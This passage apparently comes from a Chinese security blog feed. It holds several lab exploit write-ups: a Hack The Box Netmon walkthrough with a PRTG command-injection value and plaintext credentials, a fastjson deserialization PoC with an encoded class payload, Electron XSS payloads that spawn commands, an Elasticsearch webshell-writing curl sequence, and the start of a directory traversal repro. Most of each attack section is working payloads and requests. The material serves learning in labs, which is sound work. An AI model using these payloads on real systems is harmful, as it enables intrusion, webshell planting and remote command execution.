Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从控制DC。</p><p>如果想清除假冒，重启服务器即可。<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190707173053.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows认证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB 靶机 Netmon-Windows WP</title>
      <link href="/2019/06/10/htb-ba-ji-netmon-windows-wp/"/>
      <url>/2019/06/10/htb-ba-ji-netmon-windows-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Netmon-Windows"><a href="#Netmon-Windows" class="headerlink" title="Netmon-Windows"></a>Netmon-Windows</h1><p><a href="https://www.hackthebox.eu/home/machines/profile/177" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/177</a><br>IP: 10.10.10.152 </p><h2 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-10 19:45 CSTNSE: Loaded 148 scripts for scanning.NSE: Script Pre-scanning.Initiating NSE at 19:45Completed NSE at 19:45, 0.00s elapsedInitiating NSE at 19:45Completed NSE at 19:45, 0.00s elapsedInitiating Ping Scan at 19:45Scanning 10.10.10.152 [4 ports]Completed Ping Scan at 19:45, 0.32s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 19:45Completed Parallel DNS resolution of 1 host. at 19:45, 0.03s elapsedInitiating SYN Stealth Scan at 19:45Scanning 10.10.10.152 [1000 ports]Discovered open port 135/tcp on 10.10.10.152Discovered open port 139/tcp on 10.10.10.152Discovered open port 445/tcp on 10.10.10.152Discovered open port 80/tcp on 10.10.10.152Discovered open port 21/tcp on 10.10.10.152Increasing send delay for 10.10.10.152 from 0 to 5 due to 23 out of 56 dropped probes since last increase.Completed SYN Stealth Scan at 19:46, 51.60s elapsed (1000 total ports)Initiating Service scan at 19:46Scanning 5 services on 10.10.10.152Completed Service scan at 19:46, 11.53s elapsed (5 services on 1 host)Initiating OS detection (try #1) against 10.10.10.152Retrying OS detection (try #2) against 10.10.10.152Retrying OS detection (try #3) against 10.10.10.152Retrying OS detection (try #4) against 10.10.10.152Retrying OS detection (try #5) against 10.10.10.152Initiating Traceroute at 19:46Completed Traceroute at 19:46, 0.36s elapsedInitiating Parallel DNS resolution of 2 hosts. at 19:46Completed Parallel DNS resolution of 2 hosts. at 19:46, 0.04s elapsedNSE: Script scanning 10.10.10.152.Initiating NSE at 19:46NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.Completed NSE at 19:46, 11.52s elapsedInitiating NSE at 19:46Completed NSE at 19:46, 0.00s elapsedNmap scan report for 10.10.10.152Host is up (0.30s latency).Not shown: 995 closed portsPORT    STATE SERVICE      VERSION21/tcp  open  ftp          Microsoft ftpd| ftp-anon: Anonymous FTP login allowed (FTP code 230)| 02-03-19  12:18AM                 1024 .rnd| 02-25-19  10:15PM       &lt;DIR&gt;          inetpub| 07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs| 02-25-19  10:56PM       &lt;DIR&gt;          Program Files| 02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)| 02-03-19  08:08AM       &lt;DIR&gt;          Users|_02-25-19  11:49PM       &lt;DIR&gt;          Windows| ftp-syst: |_  SYST: Windows_NT80/tcp  open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479| http-methods: |_  Supported Methods: GET HEAD|_http-server-header: PRTG/18.1.37.13946| http-title: Welcome | PRTG Network Monitor (NETMON)|_Requested resource was /index.htm|_http-trane-info: Problem with XML parsing of /evox/about135/tcp open  msrpc        Microsoft Windows RPC139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-dsService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 15s, deviation: 0s, median: 15s| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2019-06-10 19:47:00|_  start_date: 2019-06-10 18:23:19TRACEROUTE (using port 25/tcp)HOP RTT       ADDRESS1   341.39 ms 10.10.14.12   341.99 ms 10.10.10.152NSE: Script Post-scanning.Initiating NSE at 19:46Completed NSE at 19:46, 0.00s elapsedInitiating NSE at 19:46Completed NSE at 19:46, 0.00s elapsedRead data files from: /usr/local/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 93.12 seconds           Raw packets sent: 1275 (60.374KB) | Rcvd: 1540 (139.830KB)</code></pre><p>!<img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610204414.png-water_print" alt=""></p><h2 id="FTP匿名登录"><a href="#FTP匿名登录" class="headerlink" title="FTP匿名登录"></a>FTP匿名登录</h2><p>发现ftp可以匿名访问：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610204426.png-water_print" alt=""></p><p>在/Users/Public/user.txt<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610204512.png-water_print" alt=""></p><p>80端口运行PRTG Network Monitor服务<br>在c:\Windows\下发现配置文件restart.bat</p><pre class=" language-bat"><code class="language-bat">net stop PRTGCoreServicecopy "c:\Windows\PRTG Configuration.dat" "C:\ProgramData\Paessler\PRTG Network Monitor"net start PRTGCoreService</code></pre><p>在C:\ProgramData\Paessler\PRTG Network Monitor目录中发现备份文件PRTG Configuration.old.bak。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610204523.png-water_print" alt=""></p><p>查找到明文用户名:prtgadmin。密码PrTg@dmin2018，尝试登陆后失败，PrTg@dmin2019登陆成功。</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190610204532.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190611092212.png-water_print" alt="登录成功"></p><h2 id="已知漏洞搜索"><a href="#已知漏洞搜索" class="headerlink" title="已知漏洞搜索"></a>已知漏洞搜索</h2><p>Google 搜索 <code>PRTG</code> 漏洞，发现<a href="https://www.codewatch.org/blog/?p=453" target="_blank" rel="noopener">PRTG &lt; 18.2.39 Command Injection Vulnerability</a></p><p>得到：在Devices菜单下的Notifications下存在命令执行漏洞。<br>在Execute Program 下 设置参数为下图所示，并保存设置。</p><p><code>test.txt;tree /f c:\Users\Administrator &gt; c:\output.txt</code></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190611101611.png-water_print" alt=""></p><p>进入Devices界面，发现一个DNS服务器处于宕机状态</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190611101956.png-water_print" alt=""></p><p>在此处添加通知，如下图所示：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190611102107.png-water_print" alt="add triggers"></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190611102024.png-water_print" alt="Object Triggers"></p><p>在ftp中发现返回结果output.txt</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190611104637.png-water_print" alt=""></p><p>尝试导出Desktop下的root.txt，更改Devices菜单下的Notifications的Execute Program参数为：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190611105120.png-water_print" alt=""></p><p>在ftp中查看返回的结果：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190611105341.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson 反序列化导致任意命令执行漏洞</title>
      <link href="/2019/06/09/fastjson-fan-xu-lie-hua-dao-zhi-ren-yi-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/06/09/fastjson-fan-xu-lie-hua-dao-zhi-ren-yi-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson-反序列化导致任意命令执行漏洞"><a href="#fastjson-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 反序列化导致任意命令执行漏洞"></a>fastjson 反序列化导致任意命令执行漏洞</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></li><li><a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" target="_blank" rel="noopener">https://github.com/shengqi158/fastjson-remote-code-execute-poc</a></li></ul><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并通过json来填充其属性值。而JDK自带的类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>中有一个私有属性<code>_bytecodes</code>，其部分方法会执行这个值中包含的Java字节码。</p><p>所以，想要使用<code>TemplatesImpl</code>的<code>_bytecodes</code>属性执行任意命令，有几个条件：</p><ol><li>目标网站使用fastjson库解析json</li><li>解析时设置了<code>Feature.SupportNonPublicField</code>，否则不支持传入私有属性</li><li>目标使用的jdk中存在<code>TemplatesImpl</code>类</li></ol><p>当然不排除有其他不需要<code>TemplatesImpl</code>的利用方法</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本环境目录结构如下：</p><ul><li>src 本项目源码<ul><li>main/java java类<ul><li>IndexFilter.java web源码</li><li>Poc.java POC源码</li></ul></li></ul></li><li>pom.xml 配置文件，使用maven可以直接将本项目编译成war包</li><li>exploit.php 读取编译好的POC字节码，并转换成base64</li><li>fastjson-1.0.war 打包好的web环境，可以直接放到tomcat下运行</li></ul><h3 id="生成字节码"><a href="#生成字节码" class="headerlink" title="生成字节码"></a>生成字节码</h3><p>第一步就是编写一个Java类，在这个类中执行命令。然后编译该类，获得.class文件，获得字节码。</p><p>修改Poc.java中你想要执行的命令，然后在本目录下使用maven对本项目进行编译，生成<code>target/classes/Poc.class</code>：</p><pre><code>mvn compile</code></pre><p>如果没有安装maven，也可以直接使用fastjson-1.0.war这个压缩包中的<code>WEB-INF/classes/Poc.class</code>。exploit.php中就是读取的这个我已经编译好的class文件。</p><h3 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h3><p>生成.class文件后，将该文件的内容进行base64编码，放在json中_bytecodes的值的位置，如下：</p><pre><code>{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMUG9jOwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAgACQcALwwAMAAxAQAhb3BlbiAvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwDAAyADMBAANQb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACwAEAAwADQANAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAAEQAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAFgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAZAAgAGgAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA=="],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}</code></pre><p>如果想使用已经编译好的.class文件，可以直接执行php exploit.php获得POC：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190609163619.png-water_print" alt=""></p><p>使用jdk1.8编译，执行的命令是<code>touch /tmp/success</code>，所以在Windows下会执行失败。Windows用户请自己修改Poc.java，生成自己的POC。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>目标是一个web应用，访问返回“Hello world”。正常POST一个json，目标会提取json对象中的name和age拼接成一句话返回：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190609163632.png-water_print" alt=""></p><p>发送步骤二中获取的POC，成功执行命令：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190609163643.png-water_print" alt=""></p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190609163653.png-water_print" alt=""></p><p>如上图，/tmp/success文件成功被创建。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Electron WebPreferences 远程命令执行漏洞</title>
      <link href="/2019/06/08/electron-webpreferences-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/06/08/electron-webpreferences-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）"><a href="#Electron-WebPreferences-远程命令执行漏洞（CVE-2018-15685）" class="headerlink" title="Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）"></a>Electron WebPreferences 远程命令执行漏洞（CVE-2018-15685）</h1><p>Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。</p><p>Electron在设置了nodeIntegration=false的情况下（默认），页面中的JavaScript无法访问node.js的内置库。CVE-2018-15685绕过了该限制，导致在用户可执行JavaScript的情况下（如访问第三方页面或APP存在XSS漏洞时），能够执行任意命令。</p><h2 id="编译APP"><a href="#编译APP" class="headerlink" title="编译APP"></a>编译APP</h2><p>执行如下命令编译一个包含漏洞的应用：</p><pre class=" language-bash"><code class="language-bash">docker-compose run -e PLATFORM<span class="token operator">=</span>win64 --rm electron</code></pre><p>其中PLATFORM的值是运行该应用的操作系统，可选项有：<code>win64</code>、<code>win32</code>、<code>mac</code>、<code>linux</code>。</p><p>编译完成后，再执行如下命令，启动web服务：</p><pre class=" language-bash"><code class="language-bash">docker-compose run --rm -p 8080:80 web</code></pre><p>此时，访问<code>http://your-ip:8080/cve-2018-15685.tar.gz</code>即可下载编译好的应用。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在本地打开应用：<br><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608164315.png-water_print" alt=""></p><p>点击提交，输入框中的内容将会显示在应用中，显然这里存在一处XSS漏洞。</p><p>提交<code>&lt;img src=1 onerror="require('child_process').exec('calc.exe')"&gt;</code>，发现没有任何反馈，原因就是nodeIntegration=false。</p><p>此时，提交POC（Windows）：</p><pre><code>&lt;img src=1 onerror="window.open().open('data:text/html,&lt;script&gt;require(\'child_process\').exec(\'calc.exe\')&lt;/script&gt;');"&gt;</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608164325.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Electron </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>electron 远程命令执行漏洞</title>
      <link href="/2019/06/08/electron-yuan-cheng-ming-ling-zhi-xing-lou-dong/"/>
      <url>/2019/06/08/electron-yuan-cheng-ming-ling-zhi-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="electron-远程命令执行漏洞（CVE-2018-1000006）"><a href="#electron-远程命令执行漏洞（CVE-2018-1000006）" class="headerlink" title="electron 远程命令执行漏洞（CVE-2018-1000006）"></a>electron 远程命令执行漏洞（CVE-2018-1000006）</h1><p>Electron是由Github开发，用HTML，CSS和JavaScript来构建跨平台桌面应用程序的一个开源库。 Electron通过将Chromium和Node.js合并到同一个运行时环境中，并将其打包为Mac，Windows和Linux系统下的应用来实现这一目的。</p><p>在Windows下，如果Electron开发的应用注册了Protocol Handler（允许用户在浏览器中召起该应用），则可能出现一个参数注入漏洞，并最终导致在用户侧执行任意命令。</p><h2 id="编译APP"><a href="#编译APP" class="headerlink" title="编译APP"></a>编译APP</h2><p>执行如下命令编译一个包含漏洞的应用：</p><pre class=" language-bash"><code class="language-bash">docker-compose run -e ARCH<span class="token operator">=</span>64 --rm electron</code></pre><p>上述命令中，因为软件需要在Windows平台上运行，所以需要设置ARCH的值为平台的位数：32或64。</p><p>编译完成后，再执行如下命令，启动web服务：</p><pre class=" language-bash"><code class="language-bash">docker-compose run --rm -p 8080:80 web</code></pre><p>此时，访问<code>http://your-ip:8080/</code>即可看到POC页面。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先，在POC页面，点击第一个链接，下载编译好的软件<code>vulhub-app.tar.gz</code>。下载完成后解压，并运行一次：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608163439.png-water_print" alt=""></p><p>这一次将注册Protocol Handler。</p><p>然后，再回到POC页面，点击第二个链接，将会弹出目标软件和计算器：</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608163449.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> electron </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elasticsearch写入webshell漏洞</title>
      <link href="/2019/06/08/elasticsearch-xie-ru-webshell-lou-dong/"/>
      <url>/2019/06/08/elasticsearch-xie-ru-webshell-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"><a href="#Elasticsearch写入webshell漏洞（WooYun-2015-110216）" class="headerlink" title="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"></a>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。</p><p>所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。</p><p>和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项<code>path.repo</code>中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。</p><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>本测试环境同时运行了<code>Tomcat</code>和<code>ElasticSearch</code>，Tomcat目录在<code>/usr/local/tomcat</code>，web目录是<code>/usr/local/tomcat/webapps</code>；ElasticSearch目录在<code>/usr/share/elasticsearch</code>。</p><p>我们的目标就是利用ElasticSearch，在<code>/usr/local/tomcat/webapps</code>目录下写入我们的webshell。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先创建一个恶意索引文档：</p><pre class=" language-bash"><code class="language-bash">curl -XPOST http://127.0.0.1:9200/yz.jsp/yz.jsp/1 -d<span class="token string">'{"&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}'</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608162107.png-water_print" alt=""></p><p>再创建一个恶意的存储库，其中<code>location</code>的值即为我要写入的路径。</p><blockquote><p>这个Repositories的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。这里我把这个路径指向到了tomcat的web部署目录，因为只要在这个文件夹创建目录Tomcat就会自动创建一个新的应用(文件名为wwwroot的话创建出来的应用名称就是wwwroot了)。</p></blockquote><pre class=" language-bash"><code class="language-bash">curl -XPUT <span class="token string">'http://127.0.0.1:9200/_snapshot/yz.jsp'</span> -d <span class="token string">'{     "type": "fs",     "settings": {          "location": "/usr/local/tomcat/webapps/wwwroot/",          "compress": false     }}'</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608162130.png-water_print" alt=""></p><p>存储库验证并创建:</p><pre class=" language-bash"><code class="language-bash">curl -XPUT <span class="token string">"http://127.0.0.1:9200/_snapshot/yz.jsp/yz.jsp"</span> -d <span class="token string">'{     "indices": "yz.jsp",     "ignore_unavailable": "true",     "include_global_state": false}'</span></code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608162150.png-water_print" alt=""></p><p>完成！</p><p>访问<code>http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp</code>，这就是我们写入的webshell。</p><p>该shell的作用是向wwwroot下的test.jsp文件中写入任意字符串，如：<code>http://127.0.0.1:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success</code>，我们再访问/wwwroot/test.jsp就能看到webshell</p><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608162204.png-water_print" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> vulhub </tag>
            
            <tag> Elasticsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch 目录穿越漏洞</title>
      <link href="/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong-1/"/>
      <url>/2019/06/08/elasticsearch-mu-lu-chuan-yue-lou-dong-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-5531）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-5531）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-5531）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-5531）</h1><p>jre版本：openjdk:8-jre<br>elasticsearch版本：v1.6.0<br>影响版本：1.6.1以下</p><p>elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在path.repo，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="新建一个仓库"><a href="#新建一个仓库" class="headerlink" title="新建一个仓库"></a>新建一个仓库</h3><pre class=" language-HTTP"><code class="language-HTTP">PUT /_snapshot/test HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 108{    "type": "fs",    "settings": {        "location": "/usr/share/elasticsearch/repo/test"     }}</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608155225.png-water_print" alt=""></p><h3 id="创建一个快照"><a href="#创建一个快照" class="headerlink" title="创建一个快照"></a>创建一个快照</h3><pre class=" language-HTTP"><code class="language-HTTP">PUT /_snapshot/test2 HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 108{    "type": "fs",    "settings": {        "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"     }}</code></pre><p><img src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190608155225.png-water_print" alt=""></p><h3 id="目录穿越读取任意文件"><a href="#目录穿越读取任意文件" class="headerlink" 